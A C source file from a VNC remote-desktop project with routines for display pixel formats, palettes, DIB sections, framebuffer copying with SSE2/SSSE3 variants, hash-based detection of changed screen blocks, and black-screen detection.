//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: bmp.c
// $Revision: 186 $
// $Date: 2014-07-04 19:05:58 +0400 (Пт, 04 июл 2014) $
// description: 
//	Chrome launch in VNC session support
//	functions for bitmaps construction and transforming

#include "project.h"
#include <wingdi.h>

#undef strlen
#undef wcslen
#undef _stricmp
#undef _mbsicmp
#undef strscmp
#undef strcmp
#undef wcscmp
#undef wsclen
#undef malloc
#undef free
#undef strupr
#undef wcsupr
#undef _mbsupr
#undef strtoul
#undef strcat
#undef wcscat

#undef _tcsrchr
#undef strchr
#undef wcschr
#undef strrchr
#undef wcsrchr
#undef _tcsicmp

#define __abs(__x) ( (__x)>=0 ? (__x) : -(__x) )

#include <emmintrin.h>
#include "..\inc\tmmintrin.h"
#include "rt\murmur.h"
#include "bmp.h"

#pragma warning(disable:4333)

typedef void (*SyncBuffersPtr)( PUCHAR lpFrom, PUCHAR lpTo, int dwLines,int dwStepFrom, int dwStepTo, int dwBytesToCopy, DWORD **lppHashes );

#ifndef min
#define min(a,b) (((a) < (b)) ? (a) : (b))
#endif

static SyncBuffersPtr SyncBuffers = NULL;

static WORD wBrush[]={0xAAAA,0x5555,0xAAAA,0x5555,0xAAAA,0x5555,0xAAAA,0x5555};
HBRUSH hFrameBrush,hBlackBrush;

void initMaxAndShift(DWORD mask, USHORT* max, UCHAR* shift) {
	if ( mask )
	{
		for ((*shift) = 0; (mask & 1) == 0; (*shift)++) {
			mask >>= 1;
		}
	}
	(*max) = (USHORT)mask;
}

WINERROR BmpGetPixelFormat( PBITMAP_INFO BitmapInfo, PPIXEL_FORMAT PixelFormat, int height, int width)
{
	DWORD rMask=0, gMask=0, bMask=0;
	HDC hDC = GetDC(NULL);
	HBITMAP hBitmap = NULL;
	WINERROR Status = NO_ERROR;
	int TrueColourFlag = FALSE;

	do 
	{
		// Check that the device capabilities are ok
		if ((GetDeviceCaps(hDC, RASTERCAPS) & RC_BITBLT) == 0)
		{
			DbgPrint("root device doesn't support BitBlt\n");
			Status = ERROR_NOT_SUPPORTED;
			break;
		}
		if ((GetDeviceCaps(hDC, RASTERCAPS) & RC_DI_BITMAP) == 0)
		{
			DbgPrint("memory device doesn't support GetDIBits\n");
			Status = ERROR_NOT_SUPPORTED;
			break;
		}

		if (GetDeviceCaps(hDC, PLANES) != 1)
		{
			DbgPrint("current display is PLANAR, not CHUNKY!\n");
			Status = ERROR_NOT_SUPPORTED;
			break;
		}

		BitmapInfo->bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
		hBitmap = CreateCompatibleBitmap(hDC,width,height);
		if (hBitmap == NULL) {
			Status = GetLastError();
			DbgPrint("failed to create memory bitmap(%d)\n", Status);
			break;
		}
		BitmapInfo->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
		BitmapInfo->bmiHeader.biBitCount = 0;
		Status = GetDIBits(hDC, hBitmap, 0, 1, NULL, (PBITMAPINFO)&BitmapInfo->bmiHeader, DIB_RGB_COLORS);
		if (Status == 0) {
			Status = GetLastError();
			DbgPrint("unable to get display format\n");
			break;
		}
		Status = GetDIBits(hDC, hBitmap,  0, 1, NULL, (PBITMAPINFO)&BitmapInfo->bmiHeader, DIB_RGB_COLORS);
		if (Status == 0) {
			Status = GetLastError();
			DbgPrint("unable to get display colour info\n");
			break;
		}
		DbgPrint("got bitmap format\n");

		// Is the bitmap palette-based or truecolour?
		TrueColourFlag = (GetDeviceCaps(hDC, RASTERCAPS) & RC_PALETTE) == 0;

		// Henceforth we want to use a top-down scanning representation
		BitmapInfo->TrueColourFlag = TrueColourFlag;
		BitmapInfo->bmiHeader.biWidth = width;
		BitmapInfo->bmiHeader.biHeight = -__abs(height);
		BitmapInfo->bmiHeader.biSizeImage = __abs((width *height *BitmapInfo->bmiHeader.biBitCount)/ 8);
		BitmapInfo->bmiHeader.biXPelsPerMeter = MulDiv(GetDeviceCaps(hDC, LOGPIXELSX),10000, 254);
		BitmapInfo->bmiHeader.biYPelsPerMeter = MulDiv(GetDeviceCaps(hDC, LOGPIXELSY),10000, 254);

		// Attempt to force the actual format into one we can handle
		// We can handle 8-bit-palette and 16/32-bit-truecolour modes
		switch (BitmapInfo->bmiHeader.biBitCount)
		{
		case 1:
		case 4:
			DbgPrint("DBG:used/bits/planes/comp/size = %d/%d/%d/%d/%d\n",
				(int)BitmapInfo->bmiHeader.biClrUsed,
				(int)BitmapInfo->bmiHeader.biBitCount,
				(int)BitmapInfo->bmiHeader.biPlanes,
				(int)BitmapInfo->bmiHeader.biCompression,
				(int)BitmapInfo->bmiHeader.biSizeImage);

			// Correct the BITMAPINFO header to the format we actually want
			BitmapInfo->bmiHeader.biClrUsed = 0;
			BitmapInfo->bmiHeader.biPlanes = 1;
			BitmapInfo->bmiHeader.biCompression = BI_RGB;
			BitmapInfo->bmiHeader.biBitCount = 8;
			BitmapInfo->bmiHeader.biSizeImage =
				__abs((BitmapInfo->bmiHeader.biWidth *
					BitmapInfo->bmiHeader.biHeight *
					BitmapInfo->bmiHeader.biBitCount)/ 8);
			BitmapInfo->bmiHeader.biClrImportant = 0;
			TrueColourFlag = FALSE;
			break;
		case 24:
			// Update the bitmapinfo header
			BitmapInfo->bmiHeader.biBitCount = 32;
			BitmapInfo->bmiHeader.biPlanes = 1;
			BitmapInfo->bmiHeader.biCompression = BI_RGB;
			BitmapInfo->bmiHeader.biSizeImage =
				__abs((BitmapInfo->bmiHeader.biWidth *
				BitmapInfo->bmiHeader.biHeight *
				BitmapInfo->bmiHeader.biBitCount)/ 8);
			break;
		}

		// Set the initial format information
		PixelFormat->TrueColourFlag = TrueColourFlag;
		PixelFormat->BigEndianFlag  = 0;
		PixelFormat->BitsPerPixel   = (UCHAR)BitmapInfo->bmiHeader.biBitCount;
		PixelFormat->Depth          = (UCHAR)BitmapInfo->bmiHeader.biBitCount;

		switch (BitmapInfo->bmiHeader.biBitCount)
		{
		case 16:
			// Standard 16-bit display
			if (BitmapInfo->bmiHeader.biCompression == BI_RGB)
			{
				// each word single pixel 5-5-5
				rMask = 0x7c00; gMask = 0x03e0; bMask = 0x001f;
			}
			else
			{
				if (BitmapInfo->bmiHeader.biCompression == BI_BITFIELDS)
				{
					rMask = *(DWORD *)&BitmapInfo->color[0];
					gMask = *(DWORD *)&BitmapInfo->color[1];
					bMask = *(DWORD *)&BitmapInfo->color[2];
				}
			}
			break;

		case 32:
			// Standard 24/32 bit displays
			if (BitmapInfo->bmiHeader.biCompression == BI_RGB)
			{
				rMask = 0xff0000; gMask = 0xff00; bMask = 0x00ff;
			}
			else
			{
				if (BitmapInfo->bmiHeader.biCompression == BI_BITFIELDS)
				{
					rMask = *(DWORD *)&BitmapInfo->color[0];
					gMask = *(DWORD *)&BitmapInfo->color[1];
					bMask = *(DWORD *)&BitmapInfo->color[2];
				}
			}
			break;

		default:
			// Other pixel formats are only valid if they're palette-based
			if (TrueColourFlag)
			{
				DbgPrint("unsupported truecolour pixel format for setpixshifts\n");
				Status = ERROR_NOT_SUPPORTED;
			}
		}

		// Convert the data we just retrieved
		initMaxAndShift(rMask, &PixelFormat->RedMax, &PixelFormat->RedShift);
		initMaxAndShift(gMask, &PixelFormat->GreenMax, &PixelFormat->GreenShift);
		initMaxAndShift(bMask, &PixelFormat->BlueMax, &PixelFormat->BlueShift);

	}while ( FALSE );

	if ( hBitmap ){
		DeleteObject(hBitmap);
	}

	if ( hDC ){
		ReleaseDC( NULL, hDC );
	}
	return Status;
}

BOOL BmpSetPalette(HDC hDC, HBITMAP hBitmap, PBITMAP_INFO BitmapInfo)
{
	if (!BitmapInfo->TrueColourFlag)
	{
		// - Handle a DIB-Section's palette

		// - Fetch the system palette for the framebuffer
		HDC bitmapDC;
		HBITMAP old_bitmap;
		UINT entries_set;
		PALETTEENTRY syspalette[256];
		RGBQUAD dibpalette[256];
		unsigned int i;
		UINT entries = GetSystemPaletteEntries(hDC, 0, 256, syspalette);

		// - Store it and convert it to RGBQUAD format
		for (i=0;i<entries;i++) {
			dibpalette[i].rgbRed = syspalette[i].peRed;
			dibpalette[i].rgbGreen = syspalette[i].peGreen;
			dibpalette[i].rgbBlue = syspalette[i].peBlue;
			dibpalette[i].rgbReserved = 0;
		}

		// - Set the rest of the palette to something nasty but usable
		for (i=entries;i<256;i++) {
			dibpalette[i].rgbRed = i % 2 ? 255 : 0;
			dibpalette[i].rgbGreen = i/2 % 2 ? 255 : 0;
			dibpalette[i].rgbBlue = i/4 % 2 ? 255 : 0;
			dibpalette[i].rgbReserved = 0;
		}

		// - Update the DIB section to use the same palette
		bitmapDC = CreateCompatibleDC(hDC);
		if (!bitmapDC) {
			DbgPrint( "unable to create temporary DC, err=%lu\n", GetLastError());
			return FALSE;
		}
		old_bitmap = (HBITMAP)SelectObject(bitmapDC, hBitmap);
		if (!old_bitmap) {
			DbgPrint( "unable to select DIB section into temporary DC, err=%lu\n", GetLastError());
			DeleteDC(bitmapDC);
			return FALSE;
		}
		entries_set = SetDIBColorTable(bitmapDC, 0, 256, dibpalette);
		if (entries_set == 0) {
			DbgPrint( "unable to set DIB section palette, err=%lu\n", GetLastError());
			//				return FALSE;
		}
		if (!SelectObject(bitmapDC, old_bitmap)) {
			DbgPrint( "unable to restore temporary DC bitmap, err=%lu\n", GetLastError());
			DeleteObject(old_bitmap);
			DeleteDC(bitmapDC);
			return FALSE;
		}
		DeleteObject(old_bitmap);
		DeleteDC(bitmapDC);
	}
	return TRUE;
}

/***************************************************************************/
#define WIDTHBYTES(bits) ((((bits) + 31) / 32) * 4)

HBITMAP 
	BmpCreateDibSection(
		HDC hDC,
		PBITMAP_INFO BmpInfo,
		void **lpBkgBits
		)
{
	UINT iUsage = BmpInfo->TrueColourFlag ? DIB_RGB_COLORS : DIB_PAL_COLORS;
	// Create a new DIB section
	return CreateDIBSection(hDC, (PBITMAPINFO)&BmpInfo->bmiHeader, iUsage, lpBkgBits, NULL, 0);
}

VOID BmpCopyScreenBuffer(PVNC_SESSION pSession,RECT *lpRect,BOOL bClient)
{
	RECT rect=*lpRect;
	DWORD bBytesPerPixel;
	int dwPixelsPerLine,dwLines,nBytesToCopyPerLine;
	
	PUCHAR lpDest,lpSrc;
	int i;

	if (rect.top < 0)
	{
		rect.bottom-=rect.top;
		rect.top=0;
	}
	if (rect.left < 0)
	{
		rect.right-=rect.left;
		rect.left=0;
	}

	if (rect.bottom > (LONG)pSession->Desktop.dwHeight){
		rect.bottom = pSession->Desktop.dwHeight;
	}
	if (rect.right > (LONG)pSession->Desktop.dwWidth){
		rect.right = pSession->Desktop.dwWidth;
	}
	if (rect.left > rect.right){
		rect.left=rect.right;
	}

	bBytesPerPixel  = pSession->Desktop.bBytesPerPixel;
	dwPixelsPerLine = rect.right  - rect.left,
	dwLines         = rect.bottom - rect.top,
	nBytesToCopyPerLine = dwPixelsPerLine*bBytesPerPixel;

	if ((dwPixelsPerLine > 0) && (dwLines > 0))
	{
		DWORD dwBytesPerLine = pSession->Desktop.dwWidthInBytes;

		GdiFlush();

		//VncLockFrameBuffer( &pSession->SharedSection );
		{
			if ( pSession->SharedSection.pFrameBuffer )
			{
				if ( !bClient )
				{
					lpSrc  = (PUCHAR)pSession->SharedSection.pFrameBuffer + 
						rect.top*dwBytesPerLine + rect.left*bBytesPerPixel;
					lpDest = (PUCHAR)pSession->Desktop.lpIntermedDIB + 
						rect.top*dwBytesPerLine + rect.left*bBytesPerPixel;
				}
				else
				{
					lpDest = (PUCHAR)pSession->SharedSection.pFrameBuffer + 
						rect.top*dwBytesPerLine + rect.left*bBytesPerPixel;
					lpSrc  = (PUCHAR)pSession->Desktop.lpIntermedDIB;// + rect.top*dwBytesPerLine + rect.left*bBytesPerPixel;
				}
				for ( i= 0; i < dwLines; i++)
				{
					memcpy(lpDest,lpSrc,nBytesToCopyPerLine);

					lpDest += dwBytesPerLine;
					lpSrc  += dwBytesPerLine;
				}
			}
		}
		//VncUnlockFrameBuffer( &pSession->SharedSection );
	}
	return;
}

//////////////////////////////////////////////////////////////////////////

void SyncBuffersSSE2( PUCHAR lpFrom, PUCHAR lpTo,int dwLines,int dwStepFrom, int dwStepTo,int dwBytesToCopy,DWORD **lppHashes)
{
	int i;
	unsigned j;
	if (!lppHashes)
	{
		for ( i=0; i < dwLines; i++)
		{
			__m128i *dw_n_block=(__m128i*)lpFrom;
			__m128i *dw_o_block=(__m128i*)lpTo;
			__m128i mTmp1;
			for ( j=0; j < dwBytesToCopy/sizeof(__m128i); j++)
			{
				mTmp1=_mm_loadu_si128(&dw_n_block[j]);
				_mm_storeu_si128(&dw_o_block[j],mTmp1);
			}
			lpFrom+=dwStepFrom;
			lpTo+=dwStepTo;
			if ((i > 0) && (!(i % 1000))){
				Sleep( 1 );
			}
		}
	}
	else
	{
		DWORD *lpHashes=*lppHashes;
		//DWORD dwmMask1[]= {0xFF00FF00,0xFF00FF00,0xFF00FF00,0xFF00FF00};
		//DWORD dwmMask2[]= {0x00FF00FF,0x00FF00FF,0x00FF00FF,0x00FF00FF};
		//__m128i mMask1=_mm_loadu_si128((__m128i*)dwmMask1);
		//__m128i mMask2=_mm_loadu_si128((__m128i*)dwmMask2);
		//__m128i mTmp1,mTmp2,mTmp3;

		for ( i=0; i < dwLines; i++)
		{
			*lpHashes = MurmurHash((char*)lpFrom,dwBytesToCopy, 0);
			//if (*lpHashes != dwHash)
			//{
			//	__m128i *dw_n_block=(__m128i*)lpFrom;
			//	__m128i *dw_o_block=(__m128i*)lpTo;
			//	for ( j=0; j < dwBytesToCopy/sizeof(__m128i); j++)
			//	{
			//		mTmp1=_mm_loadu_si128(&dw_n_block[j]);
			//		mTmp2=_mm_and_si128(mTmp1,mMask1);
			//		mTmp3=mTmp1=_mm_and_si128(mTmp1,mMask2);
			//		mTmp1=_mm_slli_epi32(mTmp1,16);
			//		mTmp3=_mm_srli_epi32(mTmp3,16);
			//		mTmp1=_mm_or_si128(mTmp1,mTmp3);
			//		mTmp1=_mm_or_si128(mTmp1,mTmp2);
			//		_mm_storeu_si128(&dw_o_block[j],mTmp1);
			//	}
			//	*lpHashes=dwHash;
			//}
			if ((i > 0) && (!(i % 1000))){
				Sleep(1);
			}
			lpHashes++;
			lpFrom+=dwStepFrom;
			lpTo+=dwStepTo;
		}
		*lppHashes=lpHashes;

	}
	return;
}

#ifndef _M_AMD64
void SyncBuffersSSSE3( PUCHAR lpFrom, PUCHAR lpTo,int dwLines,int dwStepFrom, int dwStepTo, int dwBytesToCopy,DWORD **lppHashes)
{
	int i;
	unsigned j;
	if (!lppHashes)
	{
		__m128i mTmp1;
		for ( i=0; i < dwLines; i++)
		{
			__m128i *dw_n_block=(__m128i*)lpFrom,
				*dw_o_block=(__m128i*)lpTo;
			for ( j=0; j < dwBytesToCopy/sizeof(__m128i); j++)
			{
				mTmp1=_mm_loadu_si128(&dw_n_block[j]);
				_mm_storeu_si128(&dw_o_block[j],mTmp1);
			}
			lpFrom+=dwStepFrom;
			lpTo+=dwStepTo;
			if ((i > 0) && (!(i % 1000))){
				Sleep(1);
			}
		}
	}
	else
	{
		DWORD *lpHashes=*lppHashes;
		//__m128i mTmp1,mMask;
		//*(DWORD*)&mMask.m128i_u8[0]=0x03000102;
		//*(DWORD*)&mMask.m128i_u8[4]=0x07040506;
		//*(DWORD*)&mMask.m128i_u8[8]=0x0B08090A;
		//*(DWORD*)&mMask.m128i_u8[12]=0x0F0C0D0E;

		for ( i=0; i < dwLines; i++)
		{
			*lpHashes = MurmurHash((char*)lpFrom,dwBytesToCopy,0);
			//if (*lpHashes != dwHash)
			//{
			//	__m128i *dw_n_block=(__m128i*)lpFrom;
			//	__m128i *dw_o_block=(__m128i*)lpTo;
			//	for ( j=0; j < dwBytesToCopy/sizeof(__m128i); j++)
			//	{
			//		mTmp1=_mm_loadu_si128(&dw_n_block[j]);
			//		_mm_storeu_si128(
			//			&dw_o_block[j],
			//			_mm_shuffle_epi8(mTmp1,mMask)
			//			);
			//	}
			//	*lpHashes=dwHash;
			//}
 			if ((i > 0) && (!(i % 1000))){
				Sleep(1);
			}
			lpHashes++;
			lpFrom+=dwStepFrom;
			lpTo+=dwStepTo;
		}
		*lppHashes=lpHashes;
	}
	return;
}
#endif

void SyncBuffersRegular( PUCHAR lpFrom, PUCHAR lpTo,int dwLines,int dwStepFrom, int dwStepTo, int dwBytesToCopy,DWORD **lppHashes )
{
	int i;
	if (!lppHashes)
	{
		for ( i=0; i < dwLines; i++)
		{
			memcpy(lpTo,lpFrom,dwBytesToCopy);
			lpFrom+=dwStepFrom;
			lpTo+=dwStepTo;
			if ((i > 0) && (!(i % 1000))){
				Sleep(1);
			}
		}
	}
	else
	{
		DWORD *lpHashes=*lppHashes;
		for ( i=0; i < dwLines; i++)
		{
			*lpHashes=MurmurHash((char*)lpFrom,dwBytesToCopy,0);
			//if (*lpHashes != dwHash)
			//{
			//	DWORD *dw_n_block=(DWORD*)lpFrom;
			//	DWORD *dw_o_block=(DWORD*)lpTo;
			//	for ( j=0; j < dwBytesToCopy/4; j++)
			//	{
			//		DWORD dwTmp=dw_n_block[j];
			//		dw_o_block[j]=(dwTmp & 0xFF00FF00) | ((dwTmp >> 16) & 0xFF) | ((dwTmp & 0xFF) << 16);
			//	}
			//	*lpHashes=dwHash;
			//}
			if ((i > 0) && (!(i % 1000))){
				Sleep(1);
			}
			lpHashes++;
			lpFrom+=dwStepFrom;
			lpTo+=dwStepTo;
		}
		*lppHashes=lpHashes;
	}
	return;
}

void SelectBestSyncProc()
{
	int CPUInfo[4];
	__cpuid(CPUInfo,1);
#ifndef _M_AMD64
	if (CPUInfo[2] & 0x200){
		SyncBuffers=SyncBuffersSSSE3;
	}
	else 
#endif
		if (CPUInfo[3] & 0x4000000)
	{
		SyncBuffers=SyncBuffersSSE2;
	}
	else {
		SyncBuffers = SyncBuffersRegular;
	}
	return;
}

VOID BmpCopyRectFromBuffer( PVNC_SESSION pSession, PUCHAR lpScreen, PUCHAR lpTo, LPRECT lpRect )
{
	RECT rect=*lpRect;
	PUCHAR lpFrom = lpScreen + rect.top * pSession->Desktop.dwWidthInBytes + rect.left * pSession->Desktop.bBytesPerPixel; // 1st line
	DWORD dwLines = rect.bottom - rect.top;
	DWORD dwSize = ( rect.right - rect.left ) * pSession->Desktop.bBytesPerPixel;
	SyncBuffers( 
		lpFrom, 
		lpTo, 
		dwLines, 
		pSession->Desktop.dwWidthInBytes, //step from
		dwSize, //step to
		dwSize,
		NULL 
		);
}

HRGN FastDetectChanges ( PVNC_SESSION pSession, LPRECT ClipRect, BOOL bDeepScan )
{
	BOOL bUpdated = FALSE;
	LPDWORD lpHashes      = pSession->Desktop.lpChecksums;
	PUCHAR  n_topleft_ptr = pSession->Desktop.FrameBuffer;

	DWORD dwHeight    = pSession->Desktop.dwHeight;
	DWORD dwWidth     = pSession->Desktop.dwWidth;
	DWORD bytesPerRow = pSession->Desktop.dwWidthInBytes;
	DWORD x,y,ay;
	HRGN Region;

	DWORD adler = 0;

	Region = CreateRectRgn(0,0,0,0);

	for ( y = 0; y < dwHeight; y = y + min(dwHeight-y,BLOCK_SIZE))
	{
		PUCHAR n_row_ptr  = n_topleft_ptr;
		DWORD blockbottom = min(y+BLOCK_SIZE,dwHeight);

		for ( x=0; x < dwWidth; x+=min(dwWidth-x,BLOCK_SIZE))
		{
			DWORD blockright = min(x+BLOCK_SIZE,dwWidth);
			DWORD bytesPerBlockRow = (blockright-x) * pSession->Desktop.bBytesPerPixel;
			DWORD dwHash = MurmurHash((char*)n_row_ptr,bytesPerBlockRow,0);

			if ((bDeepScan) || (*lpHashes != dwHash))
			{
				PUCHAR n_block_ptr = n_row_ptr;
				for ( ay = y; ay < blockbottom; ay++)
				{
					if (ay != y) {
						dwHash = MurmurHash((char*)n_block_ptr,bytesPerBlockRow,0);
					}
					if (*lpHashes != dwHash)
					{
						HRGN mRgn;
						RECT rc,wrc;

						rc.left = x;
						rc.top = y;
						rc.right = blockright;
						rc.bottom = blockbottom;
						if ( IntersectRect(&wrc,ClipRect,&rc) )
						{
							mRgn = CreateRectRgn(wrc.left,wrc.top,wrc.right,wrc.bottom);
							if ( mRgn ){
								bUpdated = TRUE;
								CombineRgn(Region, Region, mRgn, RGN_OR);
								SyncBuffers(n_block_ptr,NULL,blockbottom-ay,bytesPerRow,bytesPerRow,bytesPerBlockRow,&lpHashes);
								DeleteObject( mRgn );
							}
						}
						break;
					}
					lpHashes++;
					n_block_ptr += bytesPerRow;
				}
			}
			else {
				lpHashes += blockbottom - y;
			}
			n_row_ptr+=bytesPerBlockRow;
		}
		Sleep(1);
		n_topleft_ptr += bytesPerRow * BLOCK_SIZE;
	}
	if ( !bUpdated ){
		DeleteObject( Region );
		Region = NULL;
	}
	return Region;
}

#define BLACK_SCREEN_STEP 10
BOOL BmpDetectBlackSceen ( PVNC_SESSION pSession )
{
	PUCHAR FrameBuffer = pSession->Desktop.FrameBuffer;
	DWORD dwHeight     = pSession->Desktop.dwHeight;
	DWORD dwWidth      = pSession->Desktop.dwWidth;
	WORD  BPP          = pSession->Desktop.bBytesPerPixel; //BPP
	DWORD dwScreenSize = pSession->Desktop.dwScreenBufferSize / BPP;
	PUCHAR pScreen = pSession->Desktop.FrameBuffer;
	PUCHAR pScreenEnd =  pSession->Desktop.FrameBuffer + pSession->Desktop.dwScreenBufferSize - BPP*BLACK_SCREEN_STEP;
	PUCHAR BalckBuffer;
	BOOL fbResult = TRUE;

	BalckBuffer = hAlloc(BPP);
	if ( BalckBuffer )
	{
		memset(BalckBuffer,0xff,BPP);
		while ( pScreen < pScreenEnd )
		{
			if ( memcmp(pScreen,BalckBuffer,BPP) )
			{
				fbResult = FALSE;
				break;
			}
			pScreen = pScreen + (BPP)*BLACK_SCREEN_STEP;
		}
		hFree ( BalckBuffer );
	}
	return fbResult;
}

HBRUSH BmpGetBlackBrush( VOID )
{
	return hBlackBrush;
}

VOID BmpInitiPainting( VOID )
{
	HBITMAP hTmpBmp=CreateBitmap(8,8,1,1,&wBrush);
	hFrameBrush=CreatePatternBrush(hTmpBmp);
	DeleteObject(hTmpBmp);

	hBlackBrush = (HBRUSH)GetStockObject(BLACK_BRUSH);
	SelectBestSyncProc();
}